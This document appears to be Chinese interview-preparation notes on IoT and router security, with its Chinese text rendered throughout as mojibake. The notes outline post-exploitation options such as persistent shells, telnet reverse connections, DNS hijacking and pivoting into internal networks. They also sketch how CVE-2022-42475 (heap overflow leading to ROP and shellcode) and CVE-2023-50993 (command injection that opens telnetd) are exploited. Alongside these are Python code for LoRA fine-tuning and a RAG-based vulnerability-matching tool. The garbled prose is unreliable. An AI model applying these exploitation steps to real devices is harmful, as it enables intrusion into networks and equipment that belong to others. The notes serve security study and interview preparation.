3.æ£€æŸ¥å¯†ç checkçš„é€»è¾‘ï¼Œçœ‹æ˜¯å¦å­˜åœ¨ç»•è¿‡çš„å¯èƒ½


+ ==è·¯ç”±å™¨ç³»ç»Ÿå¯åŠ¨ï¼Œæˆ–è€…linuxç³»ç»Ÿå¯åŠ¨æµç¨‹æ˜¯æ€æ ·çš„ï¼Ÿ==
é¦–å…ˆæ˜¯ç¡¬ä»¶ä¸Šç”µæ‰§è¡Œboot ROMå›ºä»¶ï¼Œä¸»è¦è´Ÿè´£åŠ è½½å¼•å¯¼ç¨‹åºï¼Œå…¶ä»»åŠ¡åŒ…å«åˆå§‹åŒ–ç½‘å¡ã€å†…å­˜ç­‰å¤–è®¾ï¼ŒåŠ è½½å¹¶è§£å‹å†…æ ¸é•œåƒï¼Œè®¾ç½®å¯åŠ¨å‚æ•°ï¼Œæœ€ç»ˆè·³è½¬æ‰§è¡Œåˆ°å†…æ ¸å…¥å£ã€‚
æ¥ä¸‹æ¥å†…æ ¸å¼€å§‹è¿è¡Œï¼Œå®Œæˆç¡¬ä»¶é©±åŠ¨åˆå§‹åŒ–å’Œæ–‡ä»¶ç³»ç»ŸæŒ‚è½½åå°±ä¼šæ‰§è¡Œç¬¬ä¸€ä¸ªè¿›ç¨‹initï¼Œä¼šè¿›ä¸€æ­¥è°ƒç”¨/etc/init.d/rcSæ–‡ä»¶å®Œæˆæ¨¡å—åŠ è½½å’ŒæœåŠ¡å¯åŠ¨


+ ==æ¼æ´ååˆ©ç”¨çš„æ–¹å¼ï¼Ÿ==
1. è·å–æŒç»­çš„shellï¼Œæ„é€ telnetåå¼¹ï¼Œæˆ–è€…ä¿®æ”¹ç±»ä¼¼äºrcSå®ç°é‡å¯åç»§ç»­æ§åˆ¶
2. DNSåŠ«æŒï¼Œä¿®æ”¹ä¸ºåˆ›å»ºè‡ªå»ºçš„DNSæœåŠ¡å™¨ï¼Œä¸­é—´äººæ”»å‡»ï¼Œç”¨å·¥å…·ç›‘å¬DNSè¯·æ±‚
3. è·å–æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚å›ºä»¶ï¼Œé…ç½®æ–‡ä»¶ï¼Œå¯†ç ç­‰
4. è®¾ç½®åå‘ä»£ç†ï¼Œè¿›å…¥å†…ç½‘


+ ==å¤ç°è¿‡æ¯”è¾ƒç‰›é€¼çš„æ´(å°è±¡æ·±åˆ»çš„æ´)==

é£å¡”CVE-2022-42475ï¼Œé£å¡”é˜²ç«å¢™çš„ç‰¹ç‚¹æ˜¯å¤šä¸ªåŠŸèƒ½éƒ½æ”¾åœ¨ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œå…¶ä¸­åŒ…æ‹¬äº†sslvpnåŠŸèƒ½(è®¤è¯æœåŠ¡å™¨ï¼Œå¤–éƒ¨ç”¨æˆ·ç«¯è®¾å¤‡é€šè¿‡sslvpnæœåŠ¡å™¨è¿›å…¥å†…ç½‘)ï¼Œè¿™ä¸ªæ¼æ´ç‚¹åœ¨äºåœ¨sslvpnåœ¨æ¥å—æŠ¥æ–‡åï¼Œä¼šæ ¹æ®content-lenthåˆ†é…å†…å­˜ï¼Œå¹¶ä»socketä¸­è¯»å…¥æ•°æ®å°†å…¶é€šè¿‡memcpyæ‹·å…¥å †ç©ºé—´ä¸­ã€‚è¿™é‡Œåœ¨å–content-lenthä½œä¸ºmalloc_sizeçš„æ—¶å€™æ˜¯å–4å­—èŠ‚ï¼Œå†é€šè¿‡movsxdæ‰©å±•ä¸º8å­—èŠ‚ï¼Œå¦‚æœä¸€å¼€å§‹è¾“å…¥ä¸€ä¸ªå¤§äº4å­—èŠ‚çš„sizeï¼Œå°±ä¼šå¯¼è‡´ç”³è¯·åˆ°ä¸€ä¸ªå¾ˆå°çš„å †ï¼Œè€Œmemcpyæ˜¯æ ¹æ®è¾“å…¥çš„sizeè¿›è¡Œcpyå†…å®¹çš„ï¼Œå°±ä¼šé€ æˆå †æº¢å‡ºã€‚

åç»­åˆ©ç”¨é€šè¿‡å †å ï¼Œæº¢å‡ºè¦†ç›–SSLç»“æ„ä½“ä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œç»™å…¶ä»–socketå‘é€æ•°æ®è§¦å‘handshakeå‡½æ•°ï¼Œåˆ©ç”¨æ ˆè¿ç§»çš„gadgetæ§åˆ¶åˆ°å¯æ§æ•°æ®åŒºæ‰§è¡ŒROPï¼Œmprotectæ”¹æƒé™jmp rspæ‰§è¡Œshellcode




%% å°ç±³çš„é‚£ä¸ªæ´
CVE-2023-26315
AX9000çš„å›ºä»¶æ˜¯AArch64elæ¶æ„çš„

archæ¶æ„qemuç¯å¢ƒè·å–
ä»qcow2 é•œåƒä¸­æå–å‡ºæ¥ Linux å†…æ ¸å’Œ initrd
è¿è¡Œ %%


+ ==èƒ½è®²è®²ä½ æŒ–åˆ°çš„æ¯”è¾ƒæœ‰éš¾åº¦çš„æ´å—ï¼Œéš¾ç‚¹åœ¨å“ª==
CVE-2023-50993ï¼Œws6008æ˜¯é”æ·çš„ACäº§å“ï¼Œå®ƒçš„æ–‡ä»¶ç³»ç»Ÿæ˜¯åŸºäºluaè¯­è¨€çš„luciæ¡†æ¶å¼€å‘çš„ï¼Œæ ¹æ®è¿™ä¸ªæ¡†æ¶å¯ä»¥å»æ‰¾å®ƒçš„åŠŸèƒ½å‡½æ•°æ¥å£ï¼Œåœ¨file.luaåŒ…å«äº†ä¸€ä¸ªæ–‡ä»¶ä¸‹è½½åŠŸèƒ½ï¼ŒåŠŸèƒ½é€šè¿‡postè·å–å‚æ•°ï¼Œæœ‰è°ƒç”¨å‡½æ•°å¯¹ä¼ å…¥çš„ç›®å½•å‚æ•°è¿›è¡Œæ ¡éªŒå’Œç›®å½•ç©¿è¶Šæ£€æµ‹ï¼Œç„¶åä¼šæ‰§è¡ŒshellæŒ‡ä»¤åŒæ—¶å°†è¯»å…¥çš„æ–‡ä»¶åæ‹¼æ¥è¿›shellæŒ‡ä»¤ä¸­ï¼Œä½†æ˜¯ç¼ºå°‘å¯¹æ–‡ä»¶åçš„æ£€æµ‹ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ï¼›æ‹¼æ¥å¯¼è‡´å‘½ä»¤æ‰§è¡Œï¼Œå¼€å¯telnetd

éš¾ç‚¹åœ¨äºluciæ¡†æ¶æ¯”è¾ƒåºå¤§ï¼ŒåŸºæœ¬éƒ½è°ƒç”¨æ¡†æ¶å†…çš„å‚æ•°æ£€æµ‹å‡½æ•°è¿›è¡Œäº†å‚æ•°æ ¡éªŒï¼Œæ‰€ä»¥éœ€è¦ä»”ç»†ç†è§£å¹¶åˆ†æå„ä¸ªåŠŸèƒ½çš„æ‰§è¡Œæµç¨‹


+ ==æè¿°ä¸€ä¸‹IOTäºŒè¿›åˆ¶LLMæ¼æ´ç­›æŸ¥å·¥å…·==
å‚è€ƒLLMèŠ‚

+ ==å›ºä»¶è§£å¯†ä¸€èˆ¬æ€ä¹ˆå®ç°==
æ‰¾ä¸´ç•Œç‰ˆæœ¬

+ ==è½¦è”ç½‘äº†è§£å¤šå°‘==
åœ¨è½¦è”ç½‘æ¯”èµ›ä¸­ï¼Œæˆ‘ä¸»è¦æ¥è§¦äº† OBU å’Œ RSU è®¾å¤‡ã€‚ç”±äºè½¦è”ç½‘ä¾èµ–äºæ— çº¿é€šä¿¡åè®®ï¼ˆå¦‚ Wi-Fiã€LTE æˆ– 5Gï¼‰ï¼Œæˆ‘ä»¬è¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œé€šå¸¸ä¼šå…³æ³¨è¿™äº›è®¾å¤‡ä¹‹é—´çš„æ— çº¿é€šä¿¡ï¼Œä¸»è¦å°è¯•èƒ½å¦å¼±å¯†ç ç­‰ï¼Œæˆ‘ä¹Ÿæ£€æŸ¥äº†è®¾å¤‡çš„æ¥å£ï¼Œæµ‹è¯•æ˜¯å¦å­˜åœ¨èº«ä»½éªŒè¯æ¼æ´æˆ–å¼±å¯†ç ã€‚ä»¥åŠè½¦æœºçš„ä¸€äº›äº‘å¹³å°ï¼Œå­˜åœ¨ç›®å½•ç©¿è¶Šç­‰webæ¼æ´

### ç¼–ç¨‹è¯­è¨€
Python, C, x86/arm/mipsæ±‡ç¼–, Shell, Golang


C/C++ç»“æ„ä½“å¤§å°å¦‚ä½•è®¡ç®—ï¼Ÿ
C++çš„ç»“æ„ä½“å’ŒCçš„åŒºåˆ«ï¼Ÿ
newå’Œmallocçš„åŒºåˆ«ï¼ˆdeleteå’Œfreeçš„åŒºåˆ«ï¼‰
æ„é€ å‡½æ•°ä¸ææ„å‡½æ•°è°ƒç”¨æ—¶æœº
é‡è½½å¦‚ä½•å®ç°ï¼ˆé™æ€å‡½æ•°åé‡è½½ï¼ŒåŠ¨æ€è™šå‡½æ•°é‡å†™ï¼‰
è™šå‡½æ•°å¦‚ä½•å®ç°ï¼Ÿï¼ˆé‡ç‚¹ï¼Œå‡ ä¹å¿…é—®ï¼Œè™šè¡¨æŒ‡é’ˆä½ç½®ï¼‰
32ä½ä¸‹è°ƒç”¨çº¦å®šæœ‰å“ªäº›ï¼Ÿï¼ˆstdcall cæ ‡å‡†è°ƒç”¨ fastcall thiscallï¼‰
64ä½ä¸‹è°ƒç”¨çº¦å®šï¼Ÿï¼ˆVCï¼šrdx rcx r8 r9ï¼ŒGCC: å¤šrdi rsiï¼‰

armæ±‡ç¼–å’Œmipsæ±‡ç¼–x86æ±‡ç¼–


### é€†å‘å·¥ç¨‹

32ä½ç¨‹åºå¦‚ä½•åœ¨64ä½æœºå™¨ä¸Šè¿è¡Œï¼Ÿ
PEæ ¼å¼ï¼ˆé‡ç‚¹ï¼Œå‡ ä¹å¿…é—®
PEè£…è½½è¿›å†…å­˜æ‰§è¡Œçš„è¿‡ç¨‹ï¼ˆé‡ç‚¹ï¼Œå†…å­˜å¯¹é½ï¼ŒIATè¡¨å»ºç«‹ï¼Œé‡å®šä½ï¼‰
çŸ¥é“å“ªäº›åè°ƒè¯•æ‰‹æ®µï¼Ÿï¼ˆSEHï¼Œåæ–­ç‚¹ï¼ŒæŸ¥è°ƒè¯•ç¯å¢ƒï¼‰
+ ==GDBçš„å®ç°åŸç†==
ä¸»è¦æ˜¯é€šè¿‡ptraceå®ç°(ä¿¡å·å¤„ç†æœºåˆ¶)ï¼Œé€šè¿‡ptraceå¯åŠ¨ä¸€ä¸ªç¨‹åºå¹¶è®©å®ƒæš‚åœ
+ ==ç¡¬æ–­ç‚¹å’Œè½¯æ–­ç‚¹çš„åŒºåˆ«==
ç¡¬æ–­ç‚¹ç”±ç¡¬ä»¶æ”¯æŒçš„ï¼Œä¾èµ–äº CPU çš„ç¡¬ä»¶è°ƒè¯•åŠŸèƒ½ï¼Œç”¨ptraceæœºåˆ¶å°†æ–­ç”µåœ°å€åŠ è½½åˆ°CPUè°ƒè¯•å¯„å­˜å™¨ä¸­ï¼Œæ‰§è¡Œåˆ°æ—¶äº§ç”Ÿç¡¬ä»¶ä¸­æ–­
è½¯æ–­ç‚¹æ’å…¥ç‰¹æ®ŠæŒ‡ä»¤æ¯”å¦‚int 3ï¼Œéœ€è¦ä¿®æ”¹ç¨‹åº
æ—¥å¿—æ–­ç‚¹ï¼Œä¸æš‚åœç¨‹åºæ‰§è¡Œï¼Œåªè®°å½•æ—¥å¿—


gdb/odåŸºæœ¬å‘½ä»¤
å¦‚ä½•è„±å£³ï¼ˆå‹ç¼©å£³/åŠ å¯†å£³/è™šæ‹ŸåŒ–å£³ï¼‰
ä¸ºä»€ä¹ˆè„±å®Œå£³è¦ä¿®å¤å¯¼å…¥è¡¨ï¼Ÿ
èŠ±æŒ‡ä»¤æœ‰æ²¡æœ‰è„±è¿‡ï¼Ÿ
æœ‰æ²¡æœ‰å†™è¿‡IDAè„šæœ¬
å¦‚æœä¸€ä¸ªç¨‹åºæ²¡æœ‰å­—ç¬¦ä¸²/å­—ç¬¦ä¸²è¢«æ··æ·†äº†å¦‚ä½•æ‰¾æ ¸å¿ƒä»£ç ï¼Ÿ
Hookæœ‰å“ªäº›æ–¹æ³•ï¼Ÿï¼ˆå‡ ä¹å¿…é—®ï¼Œinline hookï¼Œå‡½æ•°è¡¨hookï¼‰
ARMæ±‡ç¼–äº†è§£è¿‡å—ï¼ˆæ²¡æœ‰...ï¼‰
windowsä¸‹æœ‰å“ªäº›æ³¨å…¥æ–¹å¼ï¼Ÿæ€ä¹ˆå®ç°ï¼Ÿï¼ˆé‡ç‚¹ï¼‰

### LLM
+ ==æœ‰ç ”ç©¶è¿‡LLMåœ¨å®‰å…¨æ¼æ´æ£€æµ‹æ–¹å‘çš„åº”ç”¨ï¼Œæ¢ç´¢ç”¨RAGæ–¹æ³•æé«˜æ¼æ´åˆ†æçš„å‡†ç¡®æ€§ï¼Œæœ‰é‡‡ç”¨LoRAå’ŒQLoRAè¿›è¡Œé«˜æ•ˆå¾®è°ƒã€ä¼˜åŒ–å¤§æ¨¡å‹çš„æ¼æ´ç†è§£èƒ½åŠ›çš„ç»éªŒ==

GPTç±»æ¨¡å‹ï¼Œæ ¸å¿ƒæ˜¯é¢„æµ‹ä¸‹ä¸€ä¸ªè¯ï¼Œæ“…é•¿ç”Ÿæˆç±»ä»»åŠ¡
BERTç±»æ¨¡å‹(åŒå‘ç¼–ç å™¨)ï¼Œæ ¸å¿ƒæ˜¯ç†è§£ä¸Šä¸‹æ–‡é¢„æµ‹è¯ï¼Œæ“…é•¿é—®ç­”å’Œè¯†åˆ«

åšä¸€ä¸ªé¡¹ç›®ï¼Œä¸»è¦é’ˆå¯¹äºŒè¿›åˆ¶å›ºä»¶ï¼Œç»“åˆå¤§æ¨¡å‹è¿›è¡Œå·²çŸ¥çš„æ¼æ´ç­›æŸ¥çš„ä¸€ä¸ªå·¥å…·è®¾è®¡



æœ€åˆæˆ‘å¼€å§‹å†™çš„æ—¶å€™æ˜¯è€ƒè™‘ç”¨å¾®è°ƒçš„æ–¹å¼æ¥å®ç°ï¼ŒæœŸæœ›è®©æ¨¡å‹å­¦ä¼šæ¼æ´ä»£ç çš„è§„å¾‹ï¼Œå®ç°è‡ªåŠ¨çš„æ¼æ´æ£€æµ‹
å…·ä½“çš„æ•ˆæœæ˜¯é€šè¿‡å¯¹å¤§æ¨¡å‹å¾®è°ƒå®ç°ï¼Œå®ç°è¯†åˆ«å”¯ä¸€ä»£ç 
ä¸»è¦ä½¿ç”¨çš„æ˜¯mistralai-7Bçš„æ¨¡å‹ï¼Œå¯¹æ¨¡å‹åš8bité‡åŒ–ï¼Œå†ç”¨loRAæ–¹å¼è¿›è¡Œå¾®è°ƒ(ä¸»æµçš„æ–¹å¼æœ‰adapterå¾®è°ƒ(æ’å…¥adapteræ¨¡å—ï¼Œé€‚ç”¨äºå¤šä»»åŠ¡å­¦ä¹ )å’ŒLoRAå¾®è°ƒ(å¼•å…¥ä½ç§©çŸ©é˜µ))
8bité‡åŒ–åŸæœ¬æ˜¯32bitæµ®ç‚¹æ•°ï¼Œè½¬åŒ–ä¸º8bitæ•´æ•°0.25 â‰ˆ 64ï¼Œå‡å°‘æ˜¾å¡å†…å­˜å ç”¨

LoRAç®€å•æ¥è¯´å°±æ˜¯ï¼ŒåŸæœ¬éœ€è¦è®­ç»ƒä¸€ä¸ª3\*3çš„çŸ©é˜µï¼Œç°åœ¨åªç”¨è®­ç»ƒ3\*1 å’Œ1\*3ï¼Œå…±6ä¸ªæ•°
ä¸»è¦é€»è¾‘å°±æ˜¯å®šä¹‰2ä¸ªæ–°çŸ©é˜µAå’ŒBï¼Œéšæœºé«˜æ–¯åˆ†å¸ƒåˆå§‹åŒ–Aï¼Œ0çŸ©é˜µåˆå§‹åŒ–Bï¼Œä½¿å¾—AXB=0ã€‚è¿™æ ·WåŸ+WAB = WåŸ

æˆ‘æ˜¯çŒªï¼Œé¦–å…ˆä¼šå¯¹è¿™3ä¸ªè¯è¿›è¡Œå‘é‡åŒ–ï¼Œç„¶åç”¨WqkvçŸ©é˜µå¯¹å‘é‡è¿›è¡Œå¤„ç†ï¼Œæ¯ä¸ªè¯éƒ½ä¼šæœ‰è‡ªå·±çš„Qã€Kã€Vå‘é‡ã€‚ç„¶åä¼šè®¡ç®—è¯ä¸è¯ä¹‹é—´çš„Qå‘é‡å’ŒKå‘é‡çš„ç›¸ä¼¼åº¦ï¼Œå¦‚æœç›¸ä¼¼åº¦é«˜ï¼Œå°±æ›´å…³æ³¨å®ƒçš„å€¼å‘é‡ã€‚ç„¶åæ ¹æ®æ¯ä¸ªè¯çš„åŠ æƒå€¼å‘é‡ä¸ºæ¯ä¸ªè¯ç”Ÿæˆä¸€ä¸ªæ–°çš„å‘é‡è¡¨ç¤º(åŒ…å«äº†è¯ä¸è¯ä¹‹é—´çš„å…³ç³»)

å®ç°ä¸Šä¸»è¦ç”¨çš„peftè¿™ä¸ªåº“ï¼Œloraçš„å‚æ•°ä¸»è¦åŒ…å«äº†ä½ç§©çŸ©é˜µçš„ç§©ã€ç¼©æ”¾å› å­(é€šå¸¸æ˜¯ç§©çš„2å€)ã€ä»¥åŠéœ€è¦å¾®è°ƒçš„æ¨¡å—(æ²¡æœ‰kï¼ŒåŸå› æ˜¯kæ˜¯ç›¸ä¼¼åº¦çš„å›ºå®šå‚è€ƒ)ç­‰
æ•´ä¸ªè¿‡ç¨‹å°±æ˜¯qLoRA

å…¶ä¸­æ¯”è¾ƒå…³é”®çš„ç‚¹ï¼Œä¸€æ˜¯loraçš„å‚æ•°å’Œtrainçš„å‚æ•°(è½®æ•°å’Œæ‰¹æ•°ï¼Œè¿˜æœ‰å­¦ä¹ ç‡)ï¼ŒäºŒå°±æ˜¯æ•°æ®é›†çš„å¤„ç†ï¼Œåº”è¯¥è¦å‡å°‘å¤§æ¨¡å‹éœ€è¦å‘æŒ¥çš„èŒƒå›´ï¼Œæ¯”å¦‚å°½é‡è®©å…¶åªå®Œæˆå¡«è¡¥çš„å·¥ä½œï¼Œæ¯”å¦‚inputæ˜¯ä¸€ä¸ªæŒ–ç©ºçš„è¯­å¥ï¼Œè€Œoutputæ˜¯æŠŠç©ºå¡«ä¸Šçš„è¯­å¥ï¼Œè¿™æ ·èƒ½å‡å°‘è®­ç»ƒçš„å¤æ‚åº¦å¹¶åŠ é€Ÿæ”¶æ•›

```python
import torch
from datasets import load_dataset
from transformers import (
    AutoModelForCausalLM,
    AutoTokenizer,
    TrainingArguments,
    Trainer,
    DataCollatorForSeq2Seq
)
import os
from peft import LoraConfig, get_peft_model, prepare_model_for_kbit_training
os.environ["TOKENIZERS_PARALLELISM"] = "false"

# åŠ è½½æ•°æ®é›†
dataset = load_dataset("json", data_files="new_decompile_ghidra_25k.jsonl")['train']

# è®¾ç½®æ¨¡å‹
tokenizer = AutoTokenizer.from_pretrained("mistralai/Mistral-7B-Instruct-v0.3", padding_side="left", trust_remote_code=True)
tokenizer.pad_token = tokenizer.eos_token

# æ•°æ®Tokenizeå¤„ç†
def tokenize(batch):
    max_length = 4096
    prompt = "What is the unique number corresponding to this code?"
    inputs = tokenizer([prompt + inst for inst in batch["instruction"]], padding="max_length", truncation=True, max_length=max_length)
    labels = tokenizer([str(o) for o in batch["output"]], padding="max_length", truncation=True, max_length=max_length).input_ids
    labels = [[-100 if token == tokenizer.pad_token_id else token for token in label] for label in labels]
    
    inputs["labels"] = labels
    return inputs

tokenized_data = dataset.map(tokenize, batched=True)  # æ‰¹æ¬¡å¤„ç†

# åŠ è½½8-bité‡åŒ–æ¨¡å‹
model = AutoModelForCausalLM.from_pretrained(
    "mistralai/Mistral-7B-Instruct-v0.3",
    load_in_8bit=True,  # å¯ç”¨ 8-bit é‡åŒ–
    device_map="auto",
    trust_remote_code=True
)

# é€‚é… 8-bit è®­ç»ƒ
model = prepare_model_for_kbit_training(model)
model.config.use_cache = False  # **ç¡®ä¿ use_cache å…³é—­ï¼Œé¿å…å†²çª**

# LoRA é…ç½®
lora_config = LoraConfig(
    r=16,
    lora_alpha=32,
    target_modules=["q_proj", "v_proj"],
    lora_dropout=0.05,
    bias="none",
    task_type="CAUSAL_LM"
)

# åº”ç”¨ LoRA é€‚é…
model = get_peft_model(model, lora_config)
for name, param in model.named_parameters():
    if param.requires_grad:
        print(f"âœ… å¯è®­ç»ƒå‚æ•°: {name}, å½¢çŠ¶: {param.shape}")

# è®­ç»ƒå‚æ•°é…ç½®
training_args = TrainingArguments(
    output_dir="finetune-mistral-ghidra",
    per_device_train_batch_size=1,
    num_train_epochs=2,
    save_strategy="epoch",
    learning_rate=2e-5,
    warmup_ratio=0.05,
    logging_steps=100,
    gradient_checkpointing=False,  # å…³é—­æ¢¯åº¦æ£€æŸ¥ç‚¹ï¼Œé¿å…æ˜¾å­˜å ç”¨è¿‡é«˜
    gradient_accumulation_steps=8,
    dataloader_num_workers=2,
    optim="paged_adamw_8bit",  # é€‚ç”¨äº8-bit é‡åŒ–è®­ç»ƒ
    lr_scheduler_type="cosine",
)

# æ•°æ®æ•´ç†å™¨
data_collator = DataCollatorForSeq2Seq(tokenizer, model=model, padding=True)

# åˆå§‹åŒ–Trainer
trainer = Trainer(
    model=model,
    train_dataset=tokenized_data,
    args=training_args,
    data_collator=data_collator,
)

# å¼€å§‹è®­ç»ƒ
train_result = trainer.train()

# # è¾“å‡ºLosså˜åŒ–
# print("è®­ç»ƒLosså˜åŒ–:")
# for log in train_result.training_loss_history:
#     print(f"Step {log['step']}: Loss = {log['loss']}")

# ä¿å­˜å¾®è°ƒåçš„æ¨¡å‹å’ŒTokenizer
trainer.save_model("./finetune-mistral-ghidra")
tokenizer.save_pretrained("./finetune-mistral-ghidra")

# åˆå¹¶ LoRA é€‚é…å™¨åˆ°åŸºç¡€æ¨¡å‹å¹¶ä¿å­˜
print("åˆå¹¶ LoRA é€‚é…å™¨åˆ°åŸå§‹æ¨¡å‹ä¸­...")
model = model.merge_and_unload()
model.save_pretrained("./finetune-mistral-ghidra/merged")
tokenizer.save_pretrained("./finetune-mistral-ghidra/merged")

print("è®­ç»ƒå’Œä¿å­˜å®Œæˆï¼Œå¾®è°ƒåçš„æ¨¡å‹åŠåˆå¹¶åçš„æ¨¡å‹å·²å­˜å‚¨åœ¨ ./finetune-mistral-ghidra ç›®å½•ä¸‹ï¼")
```


åæ¥ä¸»è¦ç°å®æ€è·¯æ˜¯ä»¥RAGçš„å½¢å¼æ¥å®ç°çš„
å¯¹å·²æœ‰æ¼æ´ä»£ç è¿›è¡Œå‘é‡åŒ–ï¼Œå†ä½¿ç”¨ FAISSæ¥å»ºç«‹å‘é‡ç´¢å¼•ï¼Œå†åŠ è½½å¤šä¸ªæ¨¡å‹åŒ…æ‹¬ç”¨äºå‘é‡åŒ–æ¼æ´ä»£ç çš„æ¨¡å‹å’Œè¯­ä¹‰åŒ¹é…çš„æ¨¡å‹ã€‚åœ¨åŒ¹é…ä¸Šä¸»è¦é€šè¿‡
BM25åŸºäºè¯é¢‘ç‡å’Œæ–‡æ¡£é•¿åº¦çš„æ¦‚ç‡æ¨¡å‹è¯„ä¼°å¾—åˆ†
FAISSç›¸ä¼¼åº¦è®¡ç®—ï¼Œé€šè¿‡ FAISS åº“å¯¹æŸ¥è¯¢ä»£ç è¿›è¡Œå‘é‡åŒ–ï¼Œè¿›è¡Œå¿«é€Ÿçš„ç›¸ä¼¼åº¦æ£€ç´¢ï¼Œæ‰¾åˆ°æœ€ç›¸ä¼¼çš„ä»£ç ç‰‡æ®µ
CodeBERTè¯­ä¹‰åŒ¹é…
é•¿åº¦æ¯”ã€æŸ¥è¯¢ä»£ç å’Œåº“ä»£ç çš„é•¿åº¦æ¯”

ç»¼åˆè¿™4ç‚¹è¿›è¡Œç»¼åˆè¯„ä¼°é€‰æ‹©ç›¸ä¼¼åº¦æœ€é«˜çš„ç»“æœè¾“å‡º

```python
import argparse
import re
import tempfile
from pathlib import Path
import time
from datasets import load_dataset
from transformers import AutoModelForCausalLM, AutoTokenizer, TrainingArguments, Trainer ,BitsAndBytesConfig, AutoModel
from peft import LoraConfig, get_peft_model
from transformers import DataCollatorForSeq2Seq
from rich.console import Console
from rich.live import Live
from rich.progress import track
from rich.table import Table
from GhidraBridge.ghidra_bridge import GhidraBridge
import json
import faiss
import numpy as np
import torch
from sentence_transformers import SentenceTransformer
from sklearn.metrics.pairwise import cosine_similarity
from rank_bm25 import BM25Okapi

class Zhuzhao:
    def _load_faiss_index(self, index_path, metadata_path):
        index = faiss.read_index(index_path)
        with open(metadata_path, "r", encoding="utf-8") as f:
            metadata = {str(entry["vector_id"]): entry for entry in map(json.loads, f)}
        return index, metadata 
       
    def _load_model(self):
        encoder = SentenceTransformer("deepseek-ai/deepseek-coder-6.7b-instruct")  # å‘é‡åŒ–
        codebert_tokenizer = AutoTokenizer.from_pretrained("microsoft/codebert-base")  # è¯­ä¹‰åŒ¹é…
        codebert_model = AutoModel.from_pretrained("microsoft/codebert-base").to("cuda")
        mistral_model_name = "mistralai/Mistral-7B-Instruct-v0.3"
        mistral_tokenizer = AutoTokenizer.from_pretrained(mistral_model_name)
        mistral_model = AutoModelForCausalLM.from_pretrained(
            mistral_model_name,
            device_map="auto",
            torch_dtype=torch.float16
        )
        return encoder, codebert_tokenizer, codebert_model, mistral_tokenizer, mistral_model

    def _compute_length_ratio(self, query_code, candidate_code):
        query_len = len(query_code)
        candidate_len = len(candidate_code)
        length_ratio = min(query_len, candidate_len) / max(query_len, candidate_len)
        return length_ratio
    

    def _bm25_filter(self, query_code, metadata, top_k=10):
        corpus = [entry["input"] for entry in metadata.values() if entry.get("input")]
        bm25 = BM25Okapi([doc.split() for doc in corpus])
        scores = bm25.get_scores(query_code.split())
        top_indices = np.argsort(scores)[::-1][:top_k]
        return [list(metadata.values())[i] for i in top_indices if scores[i] > 0]

    def _search_vulnerability(self, query_code, index, metadata, encoder, codebert_tokenizer, codebert_model, top_k=3):
        query_vector = encoder.encode(query_code).astype(np.float32).reshape(1, -1)
        distances, indices = index.search(query_vector, k=top_k)

        candidates = []
        for idx in indices[0]:
            if str(idx) in metadata:
                candidate = metadata[str(idx)]
                candidates.append(candidate)

        best_match = None
        best_score = 0

        for candidate in candidates:
            candidate_text = candidate["input"]
            length_ratio = self._compute_length_ratio(query_code, candidate_text)

            inputs = codebert_tokenizer([query_code, candidate_text], return_tensors="pt", padding=True, truncation=True).to("cuda")
            with torch.no_grad():
                embeddings = codebert_model(**inputs).last_hidden_state.mean(dim=1).cpu().numpy()

            score = cosine_similarity([embeddings[0]], [embeddings[1]])[0][0]

            print(f"[!] FAISS={distances[0][0]:.4f}, CodeBERT={score:.4f}, len_radio={length_ratio:.4f}")

            # åŒ¹é…é¡¹æ»¡è¶³ï¼š
            # 1. FAISS ç›¸ä¼¼åº¦ > 0.85
            # 2. CodeBERT è¯­ä¹‰åŒ¹é… > 0.75
            # 3. é•¿åº¦æ¯” > 0.7 
            if score > best_score and distances[0][0] < 0.85 and score > 0.75 and length_ratio > 0.7:
                best_match = candidate
                best_score = score

        if best_match:
            print(f"[+] é€‰æ‹©æœ€ä½³åŒ¹é…: ç›¸ä¼¼åº¦ {best_score:.4f}")
            return best_match
        else:
            print("[-] æ²¡æœ‰åŒ¹é…")
            return None


    def _format_vulnerability_output(self, vuln_entry):
        output_lines = vuln_entry["output"].split("\n")
        vuln_id = output_lines[0].replace("å†…éƒ¨æ¼æ´ç¼–å·: ", "").strip() if len(output_lines) > 0 else "æœªçŸ¥"
        vuln_type = output_lines[1].replace("æ¼æ´ç±»å‹: ", "").strip() if len(output_lines) > 1 else "æœªçŸ¥"
        vuln_cause = output_lines[2].replace("æ¼æ´åŸå› : ", "").strip() if len(output_lines) > 2 else "æœªçŸ¥"
        vuln_risk = output_lines[3].replace("é£é™©ç­‰çº§: ", "").strip() if len(output_lines) > 3 else "æœªçŸ¥"
        vuln_fix = output_lines[4].replace("ä¿®å¤å»ºè®®: ", "").strip() if len(output_lines) > 4 else "æœªçŸ¥"

        return f"""å†…éƒ¨æ¼æ´ç¼–å·: {vuln_id}
    æ¼æ´ç±»å‹: {vuln_type}
    æ¼æ´åŸå› : {vuln_cause}
    é£é™©ç­‰çº§: {vuln_risk}
    ä¿®å¤å»ºè®®: {vuln_fix}"""


    def _analyze_with_mistral(self, query_code, tokenizer, model):
        tokenizer.pad_token = tokenizer.eos_token
        user_message = f"""è¯·åˆ†æä»¥ä¸‹ä»£ç ï¼Œæ‰¾å‡ºæ½œåœ¨æ¼æ´å¹¶æä¾›ä¿®å¤å»ºè®®ï¼Œä¿æŒä»¥ä¸‹æ ¼å¼ï¼ˆè¯·å¡«å……å®Œæ•´ï¼‰ï¼š
    å†…éƒ¨æ¼æ´ç¼–å·: æœªçŸ¥
    æ¼æ´ç±»å‹: 
    æ¼æ´åŸå› : 
    é£é™©ç­‰çº§: 
    ä¿®å¤å»ºè®®: 

    ä»£ç å¦‚ä¸‹ï¼š
    {query_code}"""

        input_text = tokenizer.apply_chat_template(
            [{"role": "system", "content": "ä½ æ˜¯ä¸€åæ¼æ´åˆ†æä¸“å®¶ï¼Œè¯·åˆ†æä»¥ä¸‹ä»£ç æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œå¹¶è¾“å‡ºä¸¥æ ¼ç¬¦åˆæ ¼å¼çš„ç»“æœã€‚"},
            {"role": "user", "content": user_message}],
            tokenize=False
        )

        model_inputs = tokenizer(input_text, return_tensors="pt", padding=True, truncation=True, max_length=2048).to("cuda")

        with torch.no_grad():
            outputs = model.generate(**model_inputs, max_new_tokens=1024)

        return tokenizer.decode(outputs[0], skip_special_tokens=True)







    def _get_code_from_decom_file(self, path_to_file):
        with open(path_to_file, "r") as file:
            return file.read()
        
